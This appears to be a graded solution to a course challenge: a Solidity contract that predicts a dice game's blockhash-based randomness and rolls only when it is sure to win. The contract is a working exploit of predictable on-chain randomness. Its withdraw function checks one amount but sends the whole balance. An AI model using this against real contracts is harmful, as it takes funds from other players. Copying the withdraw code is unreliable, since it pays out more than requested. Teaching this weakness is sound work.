pragma solidity >=0.8.0 <0.9.0; //Do not change the solidity version as it negativly impacts submission grading
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {
	DiceGame public diceGame;

	constructor(address payable diceGameAddress) {
		diceGame = DiceGame(diceGameAddress);
	}

	// Implement the `withdraw` function to transfer Ether from the rigged contract to a specified address.
	function withdraw(address to, uint256 amount) public onlyOwner {
		require(address(this).balance >= amount, "Insufficient funds");
		(bool sent, ) = to.call{ value: address(this).balance }("");
		require(sent, "Transfer failed");
	}

	// Create the `riggedRoll()` function to predict the randomness in the DiceGame contract and only initiate a roll when it guarantees a win.
	function riggedRoll() public payable {
		// revert if not enough fund availble
		require(address(this).balance > 0.002 ether, "Insufficient funds");

		// DiceGame calculate the has using following
		// block has of last block, Dice Contract Address, nonce
		// For rigged roll, block has will be current block hash

		bytes32 currentBlockHash = blockhash(block.number - 1);
		address diceContractAddress = address(diceGame);
		uint256 nonce = diceGame.nonce();

		bytes32 hash = keccak256(
			abi.encodePacked(currentBlockHash, diceContractAddress, nonce)
		);
		uint256 roll = uint256(hash) % 16;

		console.log("\t", " Rigged Dice Game Roll:", roll);
		console.log("\t", " Block Number:", block.number - 1);

		if (roll < 3) {
			diceGame.rollTheDice{ value: 0.002 ether }();
			return;
		}
		revert("Not a good time to roll the dice");
	}

	// Include the `receive()` function to enable the contract to receive incoming Ether.
	receive() external payable {}
}
